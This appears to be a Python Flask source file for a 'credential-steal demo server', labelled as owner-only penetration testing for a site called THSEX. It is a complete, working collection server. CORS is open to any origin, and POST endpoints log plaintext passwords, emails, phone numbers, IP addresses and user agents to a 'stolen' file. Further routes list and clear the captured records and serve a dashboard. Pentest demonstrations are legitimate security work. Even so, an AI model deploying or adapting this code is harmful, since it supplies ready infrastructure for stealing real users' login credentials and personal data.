"""
THSEX credential-steal demo server (OWNER PENTEST ONLY).
Shows that login passwords arrive PLAIN TEXT to attacker — not hashed on client.
"""
import json
import os
from datetime import datetime
from pathlib import Path

from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

DATA_DIR = Path(__file__).parent / "data"
DATA_DIR.mkdir(exist_ok=True)
LOG_FILE = DATA_DIR / "stolen.jsonl"


def log_stolen(entry: dict) -> None:
    entry["received_at"] = datetime.utcnow().isoformat() + "Z"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")


def read_all() -> list:
    if not LOG_FILE.exists():
        return []
    rows = []
    for line in LOG_FILE.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if line:
            rows.append(json.loads(line))
    return rows


@app.route("/")
def health():
    return jsonify(
        {
            "service": "thsex-steal-demo",
            "warning": "PENTEST DEMO ONLY — passwords stored plain to prove risk",
            "endpoints": {
                "steal": "POST /steal",
                "steal_login": "POST /api/steal-login",
                "list": "GET /api/stolen",
            },
            "count": len(read_all()),
        }
    )


@app.route("/steal", methods=["POST", "OPTIONS"])
@app.route("/api/steal-login", methods=["POST", "OPTIONS"])
def steal():
    if request.method == "OPTIONS":
        return "", 204
    data = request.get_json(silent=True) or {}
    entry = {
        "path": request.path,
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
        "user_agent": request.headers.get("User-Agent", ""),
        "payload": data,
        "password_plain": data.get("password") or data.get("pwd") or data.get("pass"),
        "mobile": data.get("mobile") or data.get("phone"),
        "email": data.get("email"),
        "note": "Client sends password BEFORE server hashing — attacker sees plain text",
    }
    log_stolen(entry)
    return jsonify({"code": 0, "success": True, "msg": "logged"})


@app.route("/api/stolen", methods=["GET"])
def list_stolen():
    return jsonify({"code": 0, "count": len(read_all()), "data": read_all()})


@app.route("/api/stolen/clear", methods=["POST"])
def clear_stolen():
    if LOG_FILE.exists():
        LOG_FILE.write_text("", encoding="utf-8")
    return jsonify({"code": 0, "msg": "cleared"})


STATIC_DIR = Path(__file__).parent / "static"


@app.route("/panel")
@app.route("/dashboard")
def panel():
    return send_from_directory(STATIC_DIR, "index.html")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5555))
    app.run(host="0.0.0.0", port=port, debug=False)
